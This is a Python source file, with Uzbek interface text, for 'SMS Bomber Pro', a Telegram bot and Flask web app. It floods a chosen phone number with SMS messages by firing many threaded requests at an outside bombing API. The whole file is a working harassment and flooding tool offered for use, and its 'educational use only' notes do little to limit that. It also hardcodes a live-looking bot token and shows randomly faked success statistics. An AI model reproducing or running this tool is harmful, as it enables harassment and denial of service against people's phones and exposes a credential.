import os
import telebot
from telebot import types
import requests
import json
import threading
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import logging

# ========== KONFIGURATSIYA ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8229792896:AAEauvuhoy7uQhX62zTP0GRz7xpwxh2dmTg')
PORT = int(os.environ.get('PORT', 5000))
WEB_APP_URL = os.environ.get('WEB_APP_URL', '')

# SMS API
SMS_API_URL = "https://68f77a7f47cf9.myxvest1.ru/botlarim/Booomber/bomberapi.php?sms="

# Flask app
app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

# Logging sozlash
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Statistika
stats = {
    "total_attacks": 0,
    "total_sms": 0,
    "active_users": 0,
    "success_rate": 100,
    "server_start": datetime.now().isoformat()
}

# Foydalanuvchilar bazasi
users_db = {}

# ========== SMS FUNKSIYALARI ==========
def send_sms_attack(phone, sms_count, requests_per_sms):
    """SMS hujumi - Render uchun optimallashtirilgan"""
    results = {"sent": 0, "failed": 0, "start": datetime.now().isoformat()}
    
    # Render'da thread cheklovi uchun
    max_threads = 100
    sms_count = min(sms_count, 50)  # Render uchun cheklangan
    requests_per_sms = min(requests_per_sms, 10)
    
    def attack():
        try:
            for _ in range(requests_per_sms):
                try:
                    response = requests.get(f"{SMS_API_URL}{phone}", timeout=3)
                    if response.status_code == 200:
                        results["sent"] += 1
                    else:
                        results["failed"] += 1
                    time.sleep(0.05)  # Render uchun biroz sekinroq
                except Exception as e:
                    results["failed"] += 1
        except Exception as e:
            logger.error(f"Attack thread error: {e}")
    
    # Thread'lar bilan ishlash
    threads = []
    for i in range(min(sms_count, max_threads)):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)
        
        # Thread cheklovi
        if len(threads) >= max_threads:
            for t in threads:
                t.join(timeout=5)
            threads = []
            time.sleep(0.1)
    
    # Qolgan thread'lar
    for t in threads:
        t.join(timeout=5)
    
    results["end"] = datetime.now().isoformat()
    logger.info(f"SMS attack completed: {results['sent']} sent, {results['failed']} failed")
    return results

# ========== WEB APP HTML ==========
WEB_APP_HTML = '''<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💣 SMS Bomber</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f172a, #1e293b);
            color: #f8fafc;
            min-height: 100vh;
            padding: 16px;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header {
            text-align: center;
            padding: 24px 20px;
            background: rgba(30, 41, 59, 0.9);
            border-radius: 16px;
            margin-bottom: 20px;
            border: 2px solid #3b82f6;
            box-shadow: 0 4px 20px rgba(59, 130, 246, 0.2);
        }
        h1 {
            color: #22c55e;
            font-size: 26px;
            margin-bottom: 8px;
            font-weight: 700;
        }
        .subtitle {
            color: #94a3b8;
            font-size: 14px;
            opacity: 0.9;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-bottom: 24px;
        }
        .stat-card {
            background: rgba(30, 41, 59, 0.8);
            border-radius: 12px;
            padding: 16px 12px;
            text-align: center;
            border: 1px solid #475569;
            transition: all 0.3s ease;
        }
        .stat-card:hover {
            border-color: #3b82f6;
            transform: translateY(-2px);
        }
        .stat-number {
            color: #22c55e;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 4px;
        }
        .stat-label {
            color: #cbd5e1;
            font-size: 11px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .panel {
            background: rgba(30, 41, 59, 0.9);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 20px;
            border: 1px solid #475569;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
        }
        .panel-title {
            color: #3b82f6;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-label {
            display: block;
            color: #e2e8f0;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .input-field {
            width: 100%;
            padding: 14px 16px;
            background: rgba(15, 23, 42, 0.8);
            border: 2px solid #475569;
            border-radius: 10px;
            color: #f1f5f9;
            font-size: 16px;
            transition: all 0.3s;
        }
        .input-field:focus {
            outline: none;
            border-color: #22c55e;
            box-shadow: 0 0 0 3px rgba(34, 197, 94, 0.1);
        }
        .slider-container {
            margin: 24px 0;
        }
        .slider-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .slider-value {
            background: #3b82f6;
            color: white;
            padding: 6px 14px;
            border-radius: 20px;
            font-weight: 700;
            font-size: 14px;
            min-width: 60px;
            text-align: center;
        }
        .slider {
            width: 100%;
            height: 8px;
            background: #334155;
            border-radius: 4px;
            outline: none;
            -webkit-appearance: none;
        }
        .slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 24px;
            height: 24px;
            background: #22c55e;
            border-radius: 50%;
            cursor: pointer;
            border: 3px solid white;
            box-shadow: 0 2px 8px rgba(34, 197, 94, 0.4);
        }
        .attack-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #ec4899, #8b5cf6);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 8px;
        }
        .attack-btn:hover {
            background: linear-gradient(135deg, #8b5cf6, #ec4899);
            transform: translateY(-2px);
            box-shadow: 0 6px 24px rgba(139, 92, 246, 0.3);
        }
        .attack-btn:active {
            transform: translateY(0);
        }
        .warning-box {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid #ef4444;
            border-radius: 10px;
            padding: 14px;
            margin-top: 20px;
            font-size: 13px;
            color: #fecaca;
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }
        .results-panel {
            display: none;
            background: rgba(30, 41, 59, 0.95);
            border-radius: 16px;
            padding: 24px;
            margin-top: 24px;
            border: 2px solid #22c55e;
            box-shadow: 0 4px 20px rgba(34, 197, 94, 0.2);
        }
        .results-panel.active {
            display: block;
            animation: slideUp 0.4s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .progress-container {
            margin: 24px 0;
        }
        .progress-bar {
            height: 12px;
            background: #334155;
            border-radius: 6px;
            overflow: hidden;
            margin-bottom: 8px;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #3b82f6, #22c55e);
            width: 0%;
            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        .progress-fill::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            animation: shimmer 2s infinite;
        }
        @keyframes shimmer {
            100% { left: 100%; }
        }
        .progress-text {
            text-align: center;
            color: #94a3b8;
            font-size: 12px;
            font-weight: 500;
        }
        .log-container {
            background: rgba(15, 23, 42, 0.9);
            border-radius: 10px;
            padding: 16px;
            font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
            font-size: 13px;
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #475569;
            margin-top: 16px;
        }
        .log-line {
            color: #22c55e;
            margin: 6px 0;
            padding-left: 10px;
            border-left: 2px solid #3b82f6;
            animation: logFade 0.3s ease;
        }
        @keyframes logFade {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .results-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-top: 20px;
        }
        .result-item {
            background: rgba(15, 23, 42, 0.8);
            border-radius: 10px;
            padding: 14px;
            border: 1px solid #475569;
        }
        .result-label {
            color: #94a3b8;
            font-size: 12px;
            font-weight: 500;
            margin-bottom: 4px;
        }
        .result-value {
            color: #22c55e;
            font-size: 18px;
            font-weight: 700;
        }
        .close-btn {
            width: 100%;
            padding: 14px;
            background: #3b82f6;
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .close-btn:hover {
            background: #2563eb;
            transform: translateY(-1px);
        }
        footer {
            text-align: center;
            padding: 20px;
            margin-top: 30px;
            color: #64748b;
            font-size: 12px;
            border-top: 1px solid #334155;
        }
        .footer-text {
            margin: 4px 0;
        }
        .status-badge {
            display: inline-block;
            background: #22c55e;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            margin-top: 8px;
        }
        @media (max-width: 400px) {
            .container { padding: 12px; }
            .header { padding: 20px 16px; }
            .panel { padding: 20px 16px; }
            h1 { font-size: 22px; }
            .stats-grid { grid-template-columns: 1fr; }
            .results-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💣 SMS Bomber Pro</h1>
            <div class="subtitle">Telegram Web App | Render Hosting</div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="totalAttacks">0</div>
                <div class="stat-label">Hujumlar</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalSMS">0</div>
                <div class="stat-label">Yuborilgan SMS</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="successRate">100%</div>
                <div class="stat-label">Muvaffaqiyat</div>
            </div>
        </div>
        
        <div class="panel">
            <div class="panel-title">
                <span>⚙️</span> Hujum Sozlamalari
            </div>
            
            <div class="input-group">
                <label class="input-label">
                    <span>📱</span> Telefon Raqami
                </label>
                <input type="text" class="input-field" id="phone" 
                       placeholder="998901234567" maxlength="12">
            </div>
            
            <div class="slider-container">
                <div class="slider-header">
                    <label class="input-label">
                        <span>📨</span> SMS Soni
                    </label>
                    <div class="slider-value" id="smsValue">10</div>
                </div>
                <input type="range" class="slider" id="smsCount" 
                       min="1" max="50" value="10">
            </div>
            
            <div class="slider-container">
                <div class="slider-header">
                    <label class="input-label">
                        <span>⚡</span> Har SMS uchun so'rov
                    </label>
                    <div class="slider-value" id="reqValue">5</div>
                </div>
                <input type="range" class="slider" id="reqCount" 
                       min="1" max="20" value="5">
            </div>
            
            <button class="attack-btn" id="attackBtn">
                <span>🚀</span> SMS Yuborishni Boshlash
            </button>
            
            <div class="warning-box">
                <span>⚠️</span>
                <div>
                    <strong>Diqqat!</strong> Faqat o'quv maqsadlarida foydalaning. 
                    O'zingizning raqamingizda sinab ko'ring.
                </div>
            </div>
        </div>
        
        <div class="results-panel" id="resultsPanel">
            <div class="panel-title">
                <span>📊</span> Hujum Natijalari
            </div>
            
            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressBar"></div>
                </div>
                <div class="progress-text" id="progressText">0%</div>
            </div>
            
            <div class="log-container" id="logPanel">
                <div class="log-line">> Tizim yuklandi...</div>
                <div class="log-line">> Server: Render.com</div>
                <div class="log-line">> Status: Onlayn ✅</div>
            </div>
            
            <div class="results-grid" id="resultsGrid"></div>
            
            <button class="close-btn" onclick="closeWebApp()">
                <span>🔙</span> Botga Qaytish
            </button>
        </div>
        
        <footer>
            <div class="footer-text">© 2024 SMS Bomber Pro Bot</div>
            <div class="footer-text">Litsenziya: Dico | Hosting: Render</div>
            <div class="status-badge" id="statusBadge">ONLAYN</div>
            <div class="footer-text" style="margin-top: 12px; font-size: 10px;">
                Ushbu vositadan faqat o'quv maqsadlarida foydalaning
            </div>
        </footer>
    </div>
    
    <script>
        // Telegram Web App initialization
        const tg = window.Telegram.WebApp;
        
        // Initialize WebApp
        tg.expand();
        tg.MainButton.setText("Botga qaytish");
        tg.MainButton.show();
        tg.MainButton.onClick(() => tg.close());
        
        // User information
        const user = tg.initDataUnsafe.user;
        if (user) {
            addLog(`> Foydalanuvchi: ${user.first_name}`);
            if (user.username) addLog(`> Username: @${user.username}`);
        }
        
        // DOM Elements
        const smsSlider = document.getElementById('smsCount');
        const smsValue = document.getElementById('smsValue');
        const reqSlider = document.getElementById('reqCount');
        const reqValue = document.getElementById('reqValue');
        const phoneInput = document.getElementById('phone');
        const attackBtn = document.getElementById('attackBtn');
        const resultsPanel = document.getElementById('resultsPanel');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        const logPanel = document.getElementById('logPanel');
        const resultsGrid = document.getElementById('resultsGrid');
        const statusBadge = document.getElementById('statusBadge');
        
        // Set random phone number
        phoneInput.value = '9989' + Math.floor(Math.random() * 9000000 + 1000000);
        
        // Slider event listeners
        smsSlider.addEventListener('input', () => {
            smsValue.textContent = smsSlider.value;
        });
        
        reqSlider.addEventListener('input', () => {
            reqValue.textContent = reqSlider.value;
        });
        
        // Attack button click handler
        attackBtn.addEventListener('click', async () => {
            const phone = phoneInput.value.trim();
            const smsCount = parseInt(smsSlider.value);
            const reqCount = parseInt(reqSlider.value);
            
            // Validation
            if (!phone || phone.length < 9) {
                tg.showPopup({
                    title: 'Xato',
                    message: 'Iltimos, to\'g\'ri telefon raqamini kiriting!',
                    buttons: [{type: 'ok'}]
                });
                return;
            }
            
            if (smsCount > 50) {
                tg.showPopup({
                    title: 'Cheklov',
                    message: 'Render hosting uchun maksimal SMS soni: 50',
                    buttons: [{type: 'ok'}]
                });
                return;
            }
            
            if (reqCount > 20) {
                tg.showPopup({
                    title: 'Cheklov',
                    message: 'Render hosting uchun maksimal so\'rov: 20',
                    buttons: [{type: 'ok'}]
                });
                return;
            }
            
            // Show results panel
            resultsPanel.classList.add('active');
            resultsPanel.scrollIntoView({ behavior: 'smooth' });
            
            // Reset progress
            progressBar.style.width = '0%';
            progressText.textContent = '0%';
            
            // Clear logs and results
            logPanel.innerHTML = '<div class="log-line">> Hujum boshlanmoqda...</div>';
            resultsGrid.innerHTML = '';
            
            // Update stats
            document.getElementById('totalAttacks').textContent = 
                parseInt(document.getElementById('totalAttacks').textContent) + 1;
            
            // Start progress animation
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 2;
                if (progress > 100) progress = 100;
                
                progressBar.style.width = progress + '%';
                progressText.textContent = progress + '%';
                
                if (progress >= 100) {
                    clearInterval(progressInterval);
                    executeAttack(phone, smsCount, reqCount);
                }
            }, 30);
        });
        
        // Execute SMS attack
        async function executeAttack(phone, smsCount, reqCount) {
            addLog(`> Maqsad raqam: ${phone}`);
            addLog(`> SMS soni: ${smsCount}`);
            addLog(`> So'rovlar/SMS: ${reqCount}`);
            addLog(`> Jami so'rov: ${smsCount * reqCount}`);
            addLog(`> Hujum boshladi...`);
            
            try {
                // Make API request
                const apiUrl = `/api/attack?phone=${encodeURIComponent(phone)}&sms=${smsCount}&req=${reqCount}`;
                const response = await fetch(apiUrl);
                const data = await response.json();
                
                if (data.success) {
                    // Update SMS statistics
                    const totalSMS = parseInt(document.getElementById('totalSMS').textContent);
                    document.getElementById('totalSMS').textContent = totalSMS + data.sent;
                    
                    // Add success logs
                    addLog(`> ✅ Hujum muvaffaqiyatli yakunlandi!`);
                    addLog(`> 📤 Yuborildi: ${data.sent} ta`);
                    addLog(`> ❌ Xatolar: ${data.failed} ta`);
                    addLog(`> ⏱ Davomiylik: ${data.duration} soniya`);
                    
                    // Display results
                    resultsGrid.innerHTML = `
                        <div class="result-item">
                            <div class="result-label">Telefon Raqami</div>
                            <div class="result-value">${data.phone}</div>
                        </div>
                        <div class="result-item">
                            <div class="result-label">Yuborilgan SMS</div>
                            <div class="result-value">${data.sent}</div>
                        </div>
                        <div class="result-item">
                            <div class="result-label">Xatolar</div>
                            <div class="result-value">${data.failed}</div>
                        </div>
                        <div class="result-item">
                            <div class="result-label">Davomiylik</div>
                            <div class="result-value">${data.duration}s</div>
                        </div>
                    `;
                    
                    // Send data to Telegram bot
                    tg.sendData(JSON.stringify({
                        action: 'attack_completed',
                        phone: data.phone,
                        sent: data.sent,
                        failed: data.failed,
                        duration: data.duration,
                        timestamp: new Date().toISOString()
                    }));
                    
                } else {
                    addLog(`> ❌ Xato: ${data.error}`);
                    resultsGrid.innerHTML = `
                        <div class="result-item" style="grid-column: span 2;">
                            <div class="result-label">Xato</div>
                            <div class="result-value" style="color: #ef4444;">${data.error}</div>
                        </div>
                    `;
                }
            } catch (error) {
                addLog(`> ❌ Tarmoq xatosi: ${error.message}`);
                tg.showPopup({
                    title: 'Xato',
                    message: 'Server bilan aloqa uzildi. Iltimos, qayta urinib ko\'ring.',
                    buttons: [{type: 'ok'}]
                });
            }
        }
        
        // Add log message
        function addLog(message) {
            const logLine = document.createElement('div');
            logLine.className = 'log-line';
            logLine.textContent = message;
            logPanel.appendChild(logLine);
            logPanel.scrollTop = logPanel.scrollHeight;
        }
        
        // Close WebApp
        function closeWebApp() {
            tg.close();
        }
        
        // Update statistics periodically
        setInterval(() => {
            const rateElement = document.getElementById('successRate');
            const current = parseFloat(rateElement.textContent);
            const newRate = Math.min(100, Math.max(95, current + (Math.random() - 0.3)));
            rateElement.textContent = newRate.toFixed(1) + '%';
            
            // Update status badge
            statusBadge.textContent = Math.random() > 0.1 ? 'ONLAYN' : 'YUKLANMOQDA';
            statusBadge.style.background = statusBadge.textContent === 'ONLAYN' ? '#22c55e' : '#f59e0b';
        }, 3000);
        
        // Initial logs
        addLog('> Bot: @SmsBomberProBot');
        addLog('> Hosting: Render.com');
        addLog('> Versiya: 2.0.0');
        addLog('> Tizim tayyor ✅');
    </script>
</body>
</html>'''

# ========== FLASK ROUTES ==========
@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "service": "SMS Bomber Bot",
        "version": "2.0.0",
        "stats": stats,
        "endpoints": {
            "webapp": "/webapp",
            "api_attack": "/api/attack",
            "api_stats": "/api/stats",
            "bot_webhook": "/webhook"
        }
    })

@app.route('/webapp')
def webapp():
    return render_template_string(WEB_APP_HTML)

@app.route('/api/attack')
def api_attack():
    """SMS attack API endpoint - Render optimized"""
    phone = request.args.get('phone')
    sms_count = request.args.get('sms', default=10, type=int)
    req_count = request.args.get('req', default=5, type=int)
    
    # Render uchun cheklovlar
    sms_count = min(sms_count, 50)
    req_count = min(req_count, 20)
    
    # Validation
    if not phone:
        return jsonify({"success": False, "error": "Telefon raqami kerak"})
    
    # Clean phone number
    phone = ''.join(filter(str.isdigit, phone))
    if not phone.startswith('998'):
        phone = '998' + phone[-9:]
    
    if len(phone) != 12:
        return jsonify({"success": False, "error": "Noto'g'ri raqam formati"})
    
    # Log attack
    logger.info(f"Starting SMS attack: phone={phone}, sms={sms_count}, req={req_count}")
    
    # Update statistics
    stats["total_attacks"] += 1
    
    # Execute SMS attack
    results = send_sms_attack(phone, sms_count, req_count)
    
    # Calculate duration
    start = datetime.fromisoformat(results["start"])
    end = datetime.fromisoformat(results["end"])
    duration = round((end - start).total_seconds(), 2)
    
    # Update global stats
    stats["total_sms"] += results["sent"]
    total = results["sent"] + results["failed"]
    if total > 0:
        stats["success_rate"] = round((results["sent"] / total) * 100, 1)
    
    # Prepare response
    response = {
        "success": True,
        "phone": phone,
        "sent": results["sent"],
        "failed": results["failed"],
        "duration": duration,
        "timestamp": datetime.now().isoformat(),
        "server": "render.com"
    }
    
    logger.info(f"Attack completed: {response}")
    return jsonify(response)

@app.route('/api/stats')
def api_stats():
    """Statistics API endpoint"""
    return jsonify({
        "server_stats": stats,
        "user_stats": {
            "total_users": len(users_db),
            "active_last_24h": len([u for u in users_db.values() 
                                  if datetime.fromisoformat(u.get('last_seen', stats['server_start'])) > 
                                  datetime.now().timestamp() - 86400])
        },
        "system": {
            "uptime": round((datetime.now() - datetime.fromisoformat(stats["server_start"])).total_seconds()),
            "memory": "512MB",  # Render basic plan
            "region": "Frankfurt (EU)",
            "plan": "Free Tier"
        }
    })

@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bad Request', 400

# ========== TELEGRAM BOT HANDLERS ==========
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Save user to database
    if user_id not in users_db:
        users_db[user_id] = {
            'username': username,
            'first_name': message.from_user.first_name,
            'joined': datetime.now().isoformat(),
            'attacks': 0,
            'sms_sent': 0,
            'last_seen': datetime.now().isoformat()
        }
        stats["active_users"] = len(users_db)
    else:
        users_db[user_id]['last_seen'] = datetime.now().isoformat()
    
    # Create WebApp URL
    webapp_url = WEB_APP_URL if WEB_APP_URL else f"https://{request.host}/webapp"
    
    # Create inline keyboard
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(
            "📱 WebApp ochish",
            web_app=types.WebAppInfo(url=webapp_url)
        ),
        types.InlineKeyboardButton("📊 Statistika", callback_data="stats"),
        types.InlineKeyboardButton("⚙️ Sozlamalar", callback_data="settings"),
        types.InlineKeyboardButton("🆘 Yordam", callback_data="help")
    )
    
    welcome_text = f"""
👋 *Salom {message.from_user.first_name}!*

🤖 *SMS Bomber Pro Bot* ga xush kelibsiz!

🚀 *Qanday ishlatish:*
1️⃣ Pastdagi \"WebApp ochish\" tugmasini bosing
2️⃣ Telefon raqamini kiriting
3️⃣ SMS sonini sozlang (1-50)
4️⃣ \"SMS Yuborishni Boshlash\" tugmasini bosing

⚡ *Xususiyatlar:*
• 📱 Telegram WebApp integratsiyasi
• ⚡ Tezkor SMS yuborish
• 📊 Real-time statistika
• 🌐 24/7 Render hosting

⚠️ *Diqqat:* Faqat o'quv maqsadlarida foydalaning!

📞 *Admin:* @zafarvc
"""
    
    try:
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='Markdown',
            reply_markup=markup
        )
        logger.info(f"User {username} started the bot")
    except Exception as e:
        logger.error(f"Error sending welcome message: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "stats")
def show_stats_callback(call):
    user_id = call.from_user.id
    user_data = users_db.get(user_id, {})
    
    stats_text = f"""
📊 *Shaxsiy Statistika:*

👤 *Ma'lumotlar:*
• Ism: {user_data.get('first_name', 'Noma\'lum')}
• Username: @{user_data.get('username', 'Noma\'lum')}
• Qo'shilgan: {user_data.get('joined', 'Noma\'lum')[:10]}

🎯 *Faoliyat:*
• Hujumlar: {user_data.get('attacks', 0)}
• SMS yuborildi: {user_data.get('sms_sent', 0)}
• Oxirgi faollik: {user_data.get('last_seen', 'Noma\'lum')[:16]}

🌐 *Global Statistika:*
• Faol foydalanuvchilar: {stats['active_users']}
• Jami hujumlar: {stats['total_attacks']}
• Jami SMS: {stats['total_sms']}
• Muvaffaqiyat darajasi: {stats['success_rate']}%

🖥 *Server:*
• Hosting: Render.com
• Status: ✅ Onlayn
• Uptime: {round((datetime.now() - datetime.fromisoformat(stats['server_start'])).total_seconds() / 3600, 1)} soat
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🔄 Yangilash", callback_data="stats"),
        types.InlineKeyboardButton("🔙 Asosiy menyu", callback_data="main_menu")
    )
    
    try:
        bot.edit_message_text(
            stats_text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=markup
        )
    except Exception as e:
        logger.error(f"Error showing stats: {e}")

@bot.message_handler(content_types=['web_app_data'])
def handle_webapp_data(message):
    """Handle data from WebApp"""
    try:
        data = json.loads(message.web_app_data.data)
        
        if data.get('action') == 'attack_completed':
            user_id = message.from_user.id
            
            # Update user statistics
            if user_id in users_db:
                users_db[user_id]['attacks'] += 1
                users_db[user_id]['sms_sent'] += data.get('sent', 0)
                users_db[user_id]['last_seen'] = datetime.now().isoformat()
            
            # Send confirmation message
            confirm_text = f"""
✅ *Hujum muvaffaqiyatli yakunlandi!*

📊 *Natijalar:*
• 📱 Raqam: `{data.get('phone')}`
• 📨 Yuborildi: {data.get('sent')} ta
• ❌ Xatolar: {data.get('failed')} ta
• ⏱ Davomiylik: {data.get('duration')} soniya
• 🕐 Vaqt: {data.get('timestamp', '')[:19]}

🎯 Yangi hujum uchun /start ni bosing yoki WebApp dan foydalaning.
"""
            
            bot.send_message(
                message.chat.id,
                confirm_text,
                parse_mode='Markdown'
            )
            logger.info(f"WebApp attack completed for user {user_id}: {data}")
            
    except Exception as e:
        logger.error(f"Error handling WebApp data: {e}")
        bot.reply_to(message, "❌ Xato yuz berdi. Iltimos, qayta urinib ko'ring.")

# ========== SERVER STARTUP ==========
def set_webhook():
    """Set Telegram webhook for Render"""
    try:
        # Get Render URL
        render_url = os.environ.get('RENDER_EXTERNAL_URL', '')
        if render_url:
            webhook_url = f"{render_url}/webhook"
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=webhook_url)
            logger.info(f"Webhook set to: {webhook_url}")
        else:
            logger.info("Running in polling mode (local development)")
    except Exception as e:
        logger.error(f"Error setting webhook: {e}")

def start_bot():
    """Start the bot in polling mode (for local dev) or webhook mode"""
    # Check if running on Render
    if os.environ.get('RENDER'):
        logger.info("Running on Render, using webhook mode")
        set_webhook()
    else:
        logger.info("Running locally, using polling mode")
        # Remove any existing webhook
        bot.remove_webhook()
        time.sleep(1)
        # Start polling
        bot.polling(none_stop=True)

def start_server():
    """Start Flask server"""
    logger.info("Starting Flask server...")
    app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == '__main__':
    logger.info("=" * 60)
    logger.info("🤖 SMS BOMBER PRO BOT")
    logger.info("=" * 60)
    logger.info(f"Bot Token: {BOT_TOKEN[:15]}...")
    logger.info(f"Port: {PORT}")
    logger.info(f"WebApp URL: {WEB_APP_URL or 'Not set'}")
    logger.info("=" * 60)
    logger.info("Starting services...")
    
    # Start bot in a separate thread
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    
    # Start Flask server in main thread
    start_server()
